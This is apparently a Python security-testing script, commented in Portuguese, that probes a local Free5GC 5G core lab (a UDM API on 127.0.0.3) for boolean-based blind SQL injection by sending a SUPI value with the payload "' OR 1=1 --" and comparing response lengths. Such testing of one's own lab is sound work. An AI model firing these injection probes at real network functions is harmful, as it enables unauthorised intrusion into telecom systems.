import requests
import urllib3
import json
import time
import subprocess

#--- Configurações de Ambiente (Valores Padrão do Free5GC v3.4.3) ---
NF_CONFIG = {
    "UDM_IP": "127.0.0.3",
    "UDM_PORT": 8000,
    "NEF_IP": "127.0.0.1",
    "NEF_PORT": 29509,
    "SUPI_1": "imsi-208930000000001"
}

#Desabilitar avisos de certificados autoassinados
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#--- Teste de SQL Injection (Boolean-based blind) ---
def test_sql_injection():
    print("=" * 50)
    print("A1 - Testando SQL Injection em APIs (SBA)")
    print("=" * 50)

    nf_api_url_sqli = f"http://{NF_CONFIG['UDM_IP']}:{NF_CONFIG['UDM_PORT']}/api/profile"
    target_param = "id"
    headers = {"Content-Type": "application/json"}

    try:
        response_control = requests.post(nf_api_url_sqli, headers=headers, data=json.dumps({target_param: f"'{NF_CONFIG['SUPI_1']}'"}), timeout=5)
        len_control = len(response_control.text)
        response_true = requests.post(nf_api_url_sqli, headers=headers, data=json.dumps({target_param: f"'{NF_CONFIG['SUPI_1']}' OR 1=1 --"}), timeout=5)
        len_true = len(response_true.text)

        if len_true > len_control:
            print("[!!!] SQL Injection (Boolean-based) detectada! A API é vulnerável.")
        else:
            print("[+] SQL Injection (Boolean-based) não detectada.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Erro ao testar SQLi: {e}")